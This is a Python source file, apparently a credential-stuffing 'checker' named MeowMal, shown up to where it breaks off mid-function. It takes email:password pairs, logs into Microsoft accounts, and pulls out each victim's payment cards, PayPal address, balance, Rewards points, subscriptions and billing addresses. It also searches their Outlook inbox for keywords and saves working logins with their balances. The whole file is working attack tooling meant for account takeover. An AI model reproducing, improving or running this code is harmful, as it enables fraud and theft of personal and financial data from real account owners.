import concurrent.futures
import configparser
import json
import imaplib
import ssl
import os
import shutil
import random
import re
import socket
import string
import sys
import threading
import time
import traceback
import uuid
import warnings
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import readchar
import requests
import socks
import urllib3
from colorama import Fore, Style, init as colorama_init
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

colorama_init(autoreset=False, strip=False)
file_lock = threading.Lock()
proxy_lock = threading.Lock()

def write_dedupe(fname, filename, content):
    with file_lock:
        path = f'results/{fname}/{filename}'
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    if content.strip() in f.read():
                        return
            except: pass
        with open(path, 'a', encoding='utf-8', buffering=1) as f:
            f.write(content)

def get_optimized_timeout(config=None):
    if config and config.get('optimize_network', True):
        return (3, 5)
    else:
        return config.get('timeout', 8) if config else 10
if sys.platform == 'win32':
    try:
        os.system('chcp 65001 >nul 2>&1')
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
            sys.stderr.reconfigure(encoding='utf-8', errors='replace')
        else:
            import codecs
            sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, errors='replace')
            sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, errors='replace')
    except Exception:
        pass
class SimpleUtils:
    _title_cache = ''
    @staticmethod
    def set_title(title):
        if title == SimpleUtils._title_cache:
            return
        SimpleUtils._title_cache = title
        if sys.platform == 'win32':
            try:
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW(title)
            except Exception:
                pass
        else:
            try:
                sys.stdout.write(f'\x1b]0;{title}\x07')
                sys.stdout.flush()
            except Exception:
                pass
utils = SimpleUtils()
_FORMAT_THRESHOLDS = [(1000000000.0, 'B', 2), (1000000.0, 'M', 2), (1000.0, 'K', 1)]
def format_number(num):
    if not isinstance(num, (int, float)):
        try:
            num = float(num)
        except (ValueError, TypeError):
            return '0'
    num = float(num)
    if num < 0:
        return '0'
    for threshold, suffix, precision in _FORMAT_THRESHOLDS:
        if num >= threshold:
            return f'{num / threshold:.{precision}f}{suffix}'
    return str(int(num))
_DECORATIVE_SYMBOLS_RE = re.compile('[✪✿✦⚚➎★☆◆◇■□●○◎☀☁☂☃☄☾☽♛♕♚♔♤♡♢♧♠♥♦♣⚜⚡✨❖⬥⬦⬧⬨⬩⭐🌟🟊]+')
def clean_name(name):
    if not name:
        return ''
    return _DECORATIVE_SYMBOLS_RE.sub('', str(name)).strip()
def fetch_meowapi_stats(username, uuid=None):
    global config
    def format_coins(num):
        if not isinstance(num, (int, float)):
            return '0'
        num = float(num)
        abs_num = abs(num)
        if abs_num >= 1000000000000000.0:
            return f'{num / 1000000000000000.0:.1f}Q'
        if abs_num >= 1000000000000.0:
            return f'{num / 1000000000000.0:.1f}T'
        if abs_num >= 1000000000.0:
            return f'{num / 1000000000.0:.1f}B'
        if abs_num >= 1000000.0:
            return f'{num / 1000000.0:.1f}M'
        if abs_num >= 1000.0:
            return f'{num / 1000.0:.0f}K'
        return str(int(num))
    def get_skill_average(member):
        skills = member.get('skills', {})
        total_level = 0
        skill_count = 0
        skill_names = ['alchemy', 'carpentry', 'combat', 'enchanting', 'farming', 'fishing', 'foraging', 'mining', 'taming']
        for name in skill_names:
            skill_data = skills.get(name)
            if skill_data and 'levelWithProgress' in skill_data:
                total_level += skill_data['levelWithProgress']
                skill_count += 1
        return total_level / skill_count if skill_count > 0 else 0
    def clean_name_js(name):
        if not name:
            return ''
        cleaned = _DECORATIVE_SYMBOLS_RE.sub('', str(name)).strip()
        cleaned = re.sub('apis', '', cleaned, flags=re.IGNORECASE).strip()
        return cleaned
    try:
        timeout_val = int(config.get('timeout', 10))
        player_url = f'https://api.soopy.dev/player/{username}'
        p_data = None
        s_data = None
        if uuid:
            clean_uuid = uuid.replace('-', '')
            skyblock_url = f'https://soopy.dev/api/v2/player_skyblock/{clean_uuid}?networth=true'
            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                f1 = executor.submit(requests.get, player_url, timeout=timeout_val)
                f2 = executor.submit(requests.get, skyblock_url, timeout=timeout_val)
                try:
                    resp1 = f1.result()
                    if resp1.status_code == 200:
                        p_data = resp1.json()
                except:
                    pass
                try:
                    resp2 = f2.result()
                    if resp2.status_code == 200:
                        s_data = resp2.json()
                except:
                    pass
        else:
            p = requests.get(player_url, timeout=timeout_val).json()
            if p.get('success') and 'data' in p:
                p_data = p
                fetched_uuid = p['data'].get('uuid', '').replace('-', '')
                if fetched_uuid:
                    skyblock_url = f'https://soopy.dev/api/v2/player_skyblock/{fetched_uuid}?networth=true'
                    s = requests.get(skyblock_url, timeout=timeout_val).json()
                    s_data = s
        if not p_data or not p_data.get('success') or 'data' not in p_data:
            return None
        data = p_data['data']
        final_uuid = uuid.replace('-', '') if uuid else data.get('uuid', '').replace('-', '')
        ach = data.get('achievements', {})
        skywars_stars = ach.get('skywars_you_re_a_star', 0)
        arcade_coins = ach.get('arcade_arcade_banker', 0)
        bedwars_stars = ach.get('bedwars_level', 0)
        uhc_bounty = ach.get('uhc_bounty', 0)
        pit_gold = ach.get('pit_gold', 0)
        s = s_data if s_data else {}
        best_member = None
        max_score = -1
        profiles_data = s.get('data', {}).get('profiles', {})
        for profile_id, profile in profiles_data.items():
            members = profile.get('members', {})
            member = members.get(uuid)
            if member:
                nw_detailed = member.get('nwDetailed', {})
                networth = nw_detailed.get('networth', 0) if nw_detailed else 0
                skill_avg = get_skill_average(member)
                sb_lvl = member.get('skyblock_level', 0)
                score = networth / 1000000 * 100 + skill_avg * 100 + sb_lvl * 10
                if score > max_score:
                    max_score = score
                    best_member = member
        coins = kills = fairy = networth = sb_lvl = 0
        avg_skill_level = 0.0
        item_list_str = ''
        if best_member:
            coins = best_member.get('coin_purse', 0)
            kills = best_member.get('kills', {}).get('total', 0)
            fairy = best_member.get('fairy_souls_collected', 0)
            sb_lvl = best_member.get('skyblock_level', 0)
            nw_detailed = best_member.get('nwDetailed', {})
            networth = nw_detailed.get('networth', 0) if nw_detailed else 0
            types = nw_detailed.get('types', {}) if nw_detailed else {}
            if networth == 0 and coins > 0:
                networth = coins
            avg_skill_level = get_skill_average(best_member)
            def collect_items(category_data):
                items_list = []
                if category_data and category_data.get('items'):
                    for i in category_data['items']:
                        clean = clean_name_js(i.get('name'))
                        if clean:
                            items_list.append(clean)
                return items_list
            all_valid_items = []
            for cat in ['armor', 'equipment', 'wardrobe', 'weapons', 'inventory']:
                all_valid_items.extend(collect_items(types.get(cat)))
            MAX_SHOWN_ITEMS = 5
            if len(all_valid_items) > MAX_SHOWN_ITEMS:
                shown_items = ', '.join(all_valid_items[:MAX_SHOWN_ITEMS])
                remaining = len(all_valid_items) - MAX_SHOWN_ITEMS
                item_list_str = f'{shown_items}, +{remaining} more'
            else:
                item_list_str = ', '.join(all_valid_items)
        parts = []
        if networth > 0:
            parts.append(f'NW: {format_coins(networth)}')
        if coins > 0:
            parts.append(f'Purse: {format_coins(coins)}')
        if avg_skill_level > 0:
            parts.append(f'Avg_Skill: {avg_skill_level:.2f}')
        if skywars_stars > 0:
            parts.append(f'SW: {skywars_stars}')
        if bedwars_stars > 0:
            parts.append(f'BW: {bedwars_stars}')
        if pit_gold > 0:
            parts.append(f'Pit_Gold: {format_coins(pit_gold)}')
        if uhc_bounty > 0:
            parts.append(f'UHC_Bounty: {format_coins(uhc_bounty)}')
        if sb_lvl > 0:
            parts.append(f'Sb_Lvl: {sb_lvl}')
        if arcade_coins > 0:
            parts.append(f'Arcade_Coins: {format_coins(arcade_coins)}')
        if kills > 0:
            parts.append(f'Sb_Kills: {kills}')
        if fairy > 0:
            parts.append(f'Sb_Fairy_Souls: {fairy}')
        if item_list_str:
            parts.append(f'Sb_Valuable_Items: {item_list_str}')
        return ' '.join(parts) if parts else None
    except Exception:
        return None
def validate_hex_color(color_str):
    if not color_str:
        return None
    color_str = str(color_str).strip()
    if color_str.startswith('#'):
        hex_part = color_str[1:]
        if len(hex_part) == 6 and all((c in '0123456789ABCDEFabcdef' for c in hex_part)):
            try:
                return int(hex_part, 16)
            except ValueError:
                return None
    else:
        try:
            decimal_val = int(color_str)
            if 0 <= decimal_val <= 16777215:
                return decimal_val
        except ValueError:
            pass
        if len(color_str) == 6 and all((c in '0123456789ABCDEFabcdef' for c in color_str)):
            try:
                return int(color_str, 16)
            except ValueError:
                pass
    return None
from urllib.parse import urlparse, parse_qs
from io import StringIO
UI_ENABLED = True
try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.networking.packets.clientbound import play as clientbound_play, login as clientbound_login
    from minecraft.exceptions import LoginDisconnect, YggdrasilError
    import minecraft.authentication
    minecraft.authentication.HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Connection': 'close'
    }
    MINECRAFT_AVAILABLE = True
    import threading
    import sys as _sys
    _original_excepthook = threading.excepthook if hasattr(threading, 'excepthook') else None
    def _silent_excepthook(args):
        if args.exc_type in (EOFError, ConnectionError, OSError, BrokenPipeError, TimeoutError, LoginDisconnect):
            return
        if 'minecraft.networking' in str(args.exc_traceback) or 'minecraft.exceptions' in str(args.exc_traceback):
            return
        if _original_excepthook:
            _original_excepthook(args)
    if hasattr(threading, 'excepthook'):
        threading.excepthook = _silent_excepthook
    _original_sys_excepthook = _sys.excepthook
    def _silent_sys_excepthook(exc_type, exc_value, exc_traceback):
        if exc_type in (EOFError, ConnectionError, OSError, BrokenPipeError, TimeoutError, LoginDisconnect):
            if exc_traceback and ('minecraft' in str(exc_traceback.tb_frame) or 'minecraft' in str(exc_value)):
                return
        _original_sys_excepthook(exc_type, exc_value, exc_traceback)
    _sys.excepthook = _silent_sys_excepthook
except ImportError:
    MINECRAFT_AVAILABLE = False
    print(f'{Fore.YELLOW}Warning: pyCraft not available. Hypixel ban checking disabled.{Fore.RESET}')
ANSI_ESCAPE = re.compile('\\x1B(?:[@-Z\\\\-_]|\\[[0-?]*[ -/]*[@-~])')
HYPIXEL_NAME = re.compile(r'(?<=content="Plancke" /><meta property="og:locale" content="en_US" /><meta property="og:description" content=").+?(?=")', re.S)
HYPIXEL_TITLE = re.compile(r'<title>(.+?)\s*\|\s*Plancke</title>', re.IGNORECASE)
HYPIXEL_LEVEL = re.compile(r'(?<=Level:</b> ).+?(?=<br/><b>)')
FIRST_LOGIN = re.compile(r'(?<=<b>First login: </b>).+?(?=<br/><b>)')
LAST_LOGIN = re.compile(r'(?<=<b>Last login: </b>).+?(?=<br/>)')
BW_STARS = re.compile(r'(?<=<li><b>Level:</b> ).+?(?=</li>)')
SB_NETWORTH = re.compile(r'(?<= Networth: ).+?(?=\\n)')
class UIManager:
    def __init__(self):
        self.width = 120
        self.height = 30
        self.logs = []
        self.max_logs = 100
        self.log_initialized = False
        self.cui_initialized = False
        self.cui_grid_lines = 0
        self.log_area_limit = 300
        self.log_area_count = 0
        self._cached_stats = {}
        self._cached_colors = None
        self._cached_ascii_logo = None
        self.stats = {'hits': 0, 'bad': 0, 'twofa': 0, 'valid_mail': 0, 'xgp': 0, 'xgpu': 0, 'other': 0, 'mfa': 0, 'sfa': 0, 'checked': 0, 'total': 0, 'cpm': 0, 'retries': 0, 'errors': 0, 'minecraft_capes': 0, 'optifine_capes': 0, 'inbox_matches': 0, 'name_changes': 0, 'payment_methods': 0, 'banned': 0, 'unbanned': 0}
        self.start_time = None
        self._lock = threading.Lock()
    def reset_log_area(self):
        self.log_start_line = max(15, self.height - 10)
        print(f'\x1b[{self.log_start_line};0H', end='')
        self.clear_from_cursor()
        self.log_area_count = 0
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    def move_cursor_home(self):
        print('\x1b[H', end='')
    def clear_from_cursor(self):
        print('\x1b[J', end='')
    def _strip_ansi(self, text):
        return ANSI_ESCAPE.sub('', text)
    def show_ui_screen(self):
        if not getattr(self, 'log_initialized', False):
            self.clear_screen()
            _title = Fore.CYAN
            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: O.8 | Dev: MeowMal Dev's \n"
            print(Fore.CYAN + ascii_logo + Style.RESET_ALL)
            print('')
            print(f'{_title}Live Logs{Style.RESET_ALL}' + ' ' * max(0, getattr(self, 'width', 120) - len(self._strip_ansi('Live Logs'))))
            self.log_initialized = True
        return
    def screen_ui_log(self):
        return self.show_ui_screen()
    def log_info(self, message):
        print(f'{Fore.CYAN}[INFO] {message}{Fore.RESET}')
    def log_error(self, message):
        print(f'{Fore.RED}[ERROR] {message}{Fore.RESET}')
    def show_error_screen(self, error_msg):
        self.log_error(error_msg)
    def increment_stat(self, stat_name):
        if stat_name in self.stats:
            self.stats[stat_name] += 1
    def show_finished_screen(self, results_folder):
        self.clear_screen()
        elapsed = self._get_elapsed_time()
        banned_count = 0
        unbanned_count = 0
        try:
            banned_path = os.path.join(results_folder, 'Banned.txt')
            if os.path.exists(banned_path):
                with open(banned_path, 'r', encoding='utf-8', errors='ignore') as bf:
                    banned_count = sum((1 for _ in bf if _.strip()))
        except Exception:
            banned_count = 0
        try:
            unbanned_path = os.path.join(results_folder, 'Unbanned.txt')
            if os.path.exists(unbanned_path):
                with open(unbanned_path, 'r', encoding='utf-8', errors='ignore') as uf:
                    unbanned_count = sum((1 for _ in uf if _.strip()))
        except Exception:
            unbanned_count = 0
        print(f"\n{Fore.CYAN}{'═' * 83}")
        print(f'{Fore.GREEN} ✓ CHECKING COMPLETED! {Fore.RESET}')
        print(f"{Fore.CYAN}{'═' * 83}{Fore.RESET}\n")
        print(f'{Fore.WHITE}Time: {Fore.CYAN}{elapsed}{Fore.RESET}')
        print(f"{Fore.WHITE}Hits: {Fore.GREEN}{self.stats['hits']}{Fore.RESET}")
        print(f'{Fore.WHITE}Unbanned: {Fore.GREEN}{unbanned_count}{Fore.RESET}')
        print(f'{Fore.WHITE}Banned: {Fore.RED}{banned_count}{Fore.RESET}')
        print(f"{Fore.WHITE}Xgp: {Fore.LIGHTBLUE_EX}{self.stats['xgp']}{Fore.RESET}")
        print(f"{Fore.WHITE}Xgpu: {Fore.LIGHTCYAN_EX}{self.stats['xgpu']}{Fore.RESET}")
        print(f"{Fore.WHITE}Sfa: {Fore.YELLOW}{self.stats['sfa']}{Fore.RESET}\n")
    def add_log(self, message, level='INFO'):
        if level not in ('HIT', 'ERROR') and (not (level == 'INFO' and message.startswith('Other:'))):
            return
        with self._lock:
            if level == 'HIT':
                log_entry = message
            elif level == 'ERROR':
                log_entry = f'{Fore.RED}[!]{Style.RESET_ALL} {Fore.RED}{message}{Style.RESET_ALL}'
            elif level == 'INFO' and message.startswith('Other:'):
                log_entry = f'{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{message}{Style.RESET_ALL}'
            else:
                return
            self.logs.append(log_entry)
            if len(self.logs) > self.max_logs:
                self.logs = self.logs[-self.max_logs:]
            try:
                if getattr(self, 'cui_initialized', False):
                    log_start_line = getattr(self, 'log_start_line', max(5, self.height - 25))
                    log_line = log_start_line + 2 + self.log_area_count
                    if log_line >= self.height - 2:
                        self.reset_log_area()
                        log_line = log_start_line + 2
                    print(f'\x1b[{log_line};0H{log_entry}\x1b[K\x1b[{self.height};0H', end='', flush=True)
                    self.log_area_count += 1
                    if self.log_area_count >= getattr(self, 'log_area_limit', 20):
                        self.reset_log_area()
                else:
                    if getattr(self, 'log_initialized', False):
                        print(f'{log_entry}\x1b[K', flush=True)
                    else:
                        print(log_entry, flush=True)
            except Exception as e:
                print(f'Debug: add_log error: {e}')
                pass
    def log_hit_formatted(self, capture_obj, extra_stats=None, precomputed_line=None):
        try:
            elapsed_str = self._get_elapsed_time()
            time_part = f'[{elapsed_str}]'
            if capture_obj.banned and str(capture_obj.banned).startswith('[Error]'):
                status_part = '[Error]'
                color = Fore.YELLOW
            elif capture_obj.banned and capture_obj.banned != 'False':
                status_part = '[Banned]'
                color = Fore.RED
            elif capture_obj.banned == 'False':
                status_part = '[Unbanned]'
                color = Fore.GREEN
            else:
                status_part = '[Unknown]'
                color = Fore.YELLOW
            
            if capture_obj.hypixl and ('[' in capture_obj.hypixl or ']' in capture_obj.hypixl) and capture_obj.hypixl != 'N/A':
                color = Fore.CYAN
            tags_part = ''
            if capture_obj.type:
                type_upper = str(capture_obj.type).upper()
                if 'GAME PASS' in type_upper or 'XGP' in type_upper:
                    if 'ULTIMATE' in type_upper or 'XGPU' in type_upper:
                        tags_part += '[XGPU]'
                    else:
                        tags_part += '[XGP]'
                if 'MINECRAFT' in type_upper or 'MC' in type_upper:
                    tags_part += '[MC]'
            if not tags_part:
                tags_part = '[MC]'  
            if capture_obj.capes and capture_obj.capes != '':
                tags_part += f'[{capture_obj.capes}]'
            if capture_obj.cape and capture_obj.cape == 'Yes':
                tags_part += '[Optifine]'
            pwd = capture_obj.password
            if len(pwd) > 4:
                masked_pwd = pwd[:2] + '*' * (len(pwd) - 4) + pwd[-2:]
            else:
                masked_pwd = '*' * len(pwd)
            if capture_obj.hypixl and capture_obj.hypixl != 'N/A':
                user_display = capture_obj.hypixl
            else:
                user_display = capture_obj.name if capture_obj.name and capture_obj.name != 'N/A' else 'Unknown'
            account_part = f'{capture_obj.email}:{masked_pwd}:{user_display}'
            stats_parts = []
            if hasattr(capture_obj, 'bwstars') and capture_obj.bwstars:
                try:
                     val = int(str(capture_obj.bwstars).replace(',', '').strip())
                     if val > 0:
                         stats_parts.append(f'BW: {capture_obj.bwstars}')
                except:
                     if str(capture_obj.bwstars) != '0':
                         stats_parts.append(f'BW: {capture_obj.bwstars}')

            if hasattr(capture_obj, 'swstars') and capture_obj.swstars and (str(capture_obj.swstars) not in ('N/A', '', '0')):
                try:
                     val = int(str(capture_obj.swstars).replace(',', '').strip())
                     if val > 0:
                         stats_parts.append(f'SW: {capture_obj.swstars}')
                except:
                     stats_parts.append(f'SW: {capture_obj.swstars}')
            if hasattr(capture_obj, 'sbcoins') and capture_obj.sbcoins and (str(capture_obj.sbcoins) not in ('N/A', '', 'None')):
                stats_parts.append(f'Sb_Coins: {capture_obj.sbcoins}')
            if hasattr(capture_obj, 'sbnetworth') and capture_obj.sbnetworth and (str(capture_obj.sbnetworth) not in ('N/A', '', 'None')):
                stats_parts.append(f'Sb_Networth: {capture_obj.sbnetworth}')
            if hasattr(capture_obj, 'pitcoins') and capture_obj.pitcoins and (str(capture_obj.pitcoins) not in ('N/A', '', 'None')):
                stats_parts.append(f'Pit_Coins: {capture_obj.pitcoins}')
            
            stats_part = ''
            stats_part = ''
            if stats_parts:
                stats_part = ' [Hypixel: ' + ', '.join(stats_parts) + ']'
            elif extra_stats:
                clean_stats = extra_stats.strip(' |')
                stats_part = f' [Hypixel: {clean_stats}]'
            final_content = f'{time_part} {status_part}{tags_part} {account_part}{stats_part}'
            colored_line = f'{color}{final_content}{Style.RESET_ALL}'
            self.add_log(colored_line, 'HIT')
        except Exception:
            self.log_hit(getattr(capture_obj, 'email', ''), getattr(capture_obj, 'type', ''))
    def update_stats(self, **kwargs):
        for key, value in kwargs.items():
            if key in self.stats:
                self.stats[key] = value
    def increment_stat(self, stat_name, amount=1):
        if stat_name in self.stats:
            self.stats[stat_name] += amount
    def start_checking(self, total):
        self.start_time = time.time()
        self.stats['total'] = total
        self.add_log(f'Starting check on {total} accounts...', 'INFO')
    def log_hit(self, email, account_type):
        self.add_log(f'HIT: {email} | Type: {account_type}', 'HIT')
    def log_bad(self, email):
        return
    def log_2fa(self, email):
        return
    def log_payment(self, email, details):
        self.add_log(f'PAYMENT: {email} | {details}', 'PAYMENT')
    def log_error(self, message):
        self.add_log(message, 'ERROR')
        self.increment_stat('errors')
    def log_info(self, message):
        self.add_log(message, 'INFO')
    def calculate_cpm(self):
        if self.start_time and self.stats['checked'] > 0:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                self.stats['cpm'] = int(self.stats['checked'] / elapsed * 60)
    def _get_elapsed_time(self):
        if not self.start_time:
            return '00:00:00'
        elapsed = int(time.time() - self.start_time)
        hours = elapsed // 3600
        minutes = elapsed % 3600 // 60
        seconds = elapsed % 60
        return f'{hours:02d}:{minutes:02d}:{seconds:02d}'
    def _get_percentage(self, value, total):
        if total == 0:
            return '0.0%'
        return f'{value / total * 100:.1f}%'
    def _strip_ansi(self, text):
        return ANSI_ESCAPE.sub('', text)
ui = UIManager()
class MicrosoftChecker:
    def __init__(self, session, email, password, config, fname):
        self.session = session
        self.email = email
        self.password = password
        self.config = config
        self.fname = fname
        self._token_cache = {}
        self._token_cache_timeout = 300
    def get_auth_token(self, client_id, scope, redirect_uri):
        cache_key = f'{client_id}:{scope}:{redirect_uri}'
        if cache_key in self._token_cache:
            token_data = self._token_cache[cache_key]
            if time.time() - token_data['timestamp'] < self._token_cache_timeout:
                return token_data['token']
        try:
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri={redirect_uri}&prompt=none'
            r = self.session.get(auth_url, timeout=int(self.config.get('timeout', 10)))
            token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
            if token:
                self._token_cache[cache_key] = {'token': token, 'timestamp': time.time()}
            else:
                pass
            return token
        except (requests.RequestException, TimeoutError, ConnectionError) as e:
            return None
    def check_balance(self):
        try:
            token = self.get_auth_token('000000000004773A', 'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete', 'https://account.microsoft.com/auth/complete-silent-delegate-auth')
            if not token:
                return None
            headers = {'Authorization': f'MSADELEGATE1.0={token}', 'Accept': 'application/json'}
            r = self.session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=15)
            if r.status_code == 200:
                balance_match = re.search('"balance":(\\d+\\.?\\d*)', r.text)
                if balance_match:
                    balance = balance_match.group(1)
                    currency_match = re.search('"currency":"([A-Z]{3})"', r.text)
                    currency = currency_match.group(1) if currency_match else 'USD'
                    return f'{balance} {currency}'
            return '0.00 USD'
        except (requests.RequestException, TimeoutError, ConnectionError, json.JSONDecodeError):
            return None
    def check_rewards_points(self):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Pragma': 'no-cache', 'Accept': '*/*'}
            r = self.session.get('https://rewards.bing.com/', headers=headers, timeout=int(self.config.get('timeout', 10)))
            if 'action="https://rewards.bing.com/signin-oidc"' in r.text or 'id="fmHF"' in r.text:
                action_match = re.search('action="([^"]+)"', r.text)
                if action_match:
                    action_url = action_match.group(1)
                    data = {}
                    for input_match in re.finditer('<input type="hidden" name="([^"]+)" id="[^"]+" value="([^"]+)">', r.text):
                        data[input_match.group(1)] = input_match.group(2)
                    r = self.session.post(action_url, data=data, headers=headers, timeout=int(self.config.get('timeout', 10)))
            all_matches = re.findall(',"availablePoints":(\\d+)', r.text)
            if all_matches:
                points = max(all_matches, key=int)
                if points != '0':
                    return points
            headers_home = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Referer': 'https://www.bing.com/', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'}
            self.session.get('https://www.bing.com/', headers=headers_home, timeout=15)
            ts = int(time.time() * 1000)
            flyout_url = f'https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp={ts}'
            headers_flyout = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Accept-Encoding': 'identity', 'Referer': 'https://www.bing.com/', 'X-Requested-With': 'XMLHttpRequest'}
            r_flyout = self.session.get(flyout_url, headers=headers_flyout, timeout=15)
            if r_flyout.status_code == 200:
                try:
                    data = r_flyout.json()
                    if data.get('userInfo', {}).get('isRewardsUser'):
                        balance = data.get('userInfo', {}).get('balance')
                        return str(balance)
                except ValueError:
                    pass
            return None
        except Exception:
            return None
    def check_payment_instruments(self):
        try:
            token = self.get_auth_token('000000000004773A', 'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete', 'https://account.microsoft.com/auth/complete-silent-delegate-auth')
            if not token:
                return []
            headers = {'Authorization': f'MSADELEGATE1.0={token}', 'Accept': 'application/json'}
            r = self.session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=15)
            instruments = []
            if r.status_code == 200:
                try:
                    data = r.json()
                    for item in data:
                        if 'paymentMethod' in item:
                            pm = item['paymentMethod']
                            family = pm.get('paymentMethodFamily')
                            type_ = pm.get('paymentMethodType')
                            if family == 'credit_card':
                                last4 = pm.get('lastFourDigits', 'N/A')
                                expiry = f"{pm.get('expiryMonth', '')}/{pm.get('expiryYear', '')}"
                                instruments.append(f'CC: {type_} *{last4} ({expiry})')
                            elif family == 'paypal':
                                email = pm.get('email', 'N/A')
                                instruments.append(f'PayPal: {email}')
                except:
                    pass
            return instruments
        except Exception:
            return []
    def check_subscriptions(self):
        try:
            r = self.session.get('https://account.microsoft.com/services/api/subscriptions', timeout=15)
            subs = []
            if r.status_code == 200:
                try:
                    data = r.json()
                    for item in data:
                        if item.get('status') == 'Active':
                            name = item.get('productName', 'Unknown Subscription')
                            recurrence = item.get('recurrenceState', '')
                            subs.append(f'{name} ({recurrence})')
                except:
                    pass
            return subs
        except Exception:
            return []
    def check_billing_address(self):
        try:
            r = self.session.get('https://account.microsoft.com/billing/api/addresses', timeout=15)
            addresses = []
            if r.status_code == 200:
                try:
                    data = r.json()
                    for item in data:
                        line1 = item.get('line1', '')
                        city = item.get('city', '')
                        postal = item.get('postalCode', '')
                        country = item.get('country', '')
                        if line1:
                            addresses.append(f'{line1}, {city}, {postal}, {country}')
                except:
                    pass
            return addresses
        except Exception:
            return []

    def check_inbox(self, keywords):
        try:
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            token = self.get_auth_token('0000000048170EF2', scope, 'https://login.live.com/oauth20_desktop.srf')
            if not token:
                token = self.get_auth_token('0000000048170EF2', 'service::outlook.office.com::MBI_SSL', 'https://login.live.com/oauth20_desktop.srf')
            if not token:
                return []
            cid = self.session.cookies.get('MSPCID')
            if not cid:
                try:
                    self.session.get('https://outlook.live.com/owa/', timeout=10)
                    cid = self.session.cookies.get('MSPCID')
                except:
                    pass
            if not cid:
                cid = self.email
            headers = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Host': 'substrate.office.com'}
            results = []
            for keyword in keywords:
                try:
                    payload = {'Cvid': '7ef2720e-6e59-ee2b-a217-3a4f427ab0f7', 'Scenario': {'Name': 'owa.react'}, 'TimeZone': 'Egypt Standard Time', 'TextDecorations': 'Off', 'EntityRequests': [{'EntityType': 'Conversation', 'ContentSources': ['Exchange'], 'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]}, 'From': 0, 'Query': {'QueryString': keyword}, 'RefiningQueries': None, 'Size': 25, 'Sort': [{'Field': 'Score', 'SortDirection': 'Desc', 'Count': 3}, {'Field': 'Time', 'SortDirection': 'Desc'}], 'EnableTopResults': True, 'TopResultsCount': 3}], 'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}], 'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True, 'SupportedRecourseDisplayTypes': ['Suggestion', 'NoResultModification', 'NoResultFolderRefinerModification', 'NoRequeryModification', 'Modification']}, 'LogicalId': '446c567a-02d9-b739-b9ca-616e0d45905c'}
                    r = self.session.post('https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124', json=payload, headers=headers, timeout=15)
                    if r.status_code == 200:
                        data = r.json()
                        total = 0
                        if 'EntitySets' in data:
                            for entity_set in data['EntitySets']:
                                if 'ResultSets' in entity_set:
                                    for result_set in entity_set['ResultSets']:
                                        if 'Total' in result_set:
                                            total += result_set['Total']
                                        elif 'ResultCount' in result_set:
                                            total += result_set['ResultCount']
                                        elif 'Results' in result_set:
                                            total += len(result_set['Results'])
                        if total > 0:
                            results.append((keyword, total))
                except Exception:
                    pass
            return results
        except Exception:
            return []
def check_microsoft_account(session, email, password, config, fname):
    try:
        checker = MicrosoftChecker(session, email, password, config, fname)
        results = {}

        def check_balance():
            if config.get('check_microsoft_balance'):
                balance = checker.check_balance()
                if balance:
                    try:
                        amount_str = re.sub('[^\\d\\.]', '', str(balance))
                        if amount_str and float(amount_str) > 0:
                            write_dedupe(fname, 'Microsoft_Balance.txt', f'{email}:{password} | Balance: {balance}\n')
                            return ('balance', balance)
                    except Exception:
